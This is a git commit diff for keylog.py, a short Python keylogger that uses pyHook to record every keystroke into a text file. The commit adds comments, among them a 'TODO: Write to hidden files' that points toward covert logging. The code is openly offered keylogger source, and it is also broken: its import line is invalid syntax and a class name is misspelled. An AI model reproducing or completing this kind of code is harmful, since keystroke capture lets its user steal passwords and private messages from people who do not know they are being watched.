bd185e42bc8fa69e74cefc4c4f1f5df92dcfd593
Blawle <44331563+Blawle@users.noreply.github.com>
2019-10-09 00:04:00 -0400

    Update keylog.py

--- keylog.py
+++ keylog.py
@@ -1,8 +1,9 @@
 import pythoncom, import pyHook
 
+# Define KeyPress Event
 def keypressed(event):
     global store
-
+#     Confirm extra keys will be shown to make the output readable
     if event.Ascii == 13:
         keys = ' < ENTER >'
     elif event.Ascii == 8:
@@ -11,7 +12,7 @@ def keypressed(event):
         keys = chr(event.Ascii)
 
     store = store + keys
-
+# TODO: Write to hidden files
     fp = open("keylogs.txt", "w")
     fp.write(store)
     print(store)
@@ -19,9 +20,11 @@ def keypressed(event):
 
     return True
 
+# Confirm event to create keypress event
 store = ''
 obj = pyHook.HookManger()
 obj.KeyDown = keypressed
 
+# 
 obj.HookKeyboard()
 pythoncom.PumpMessages()
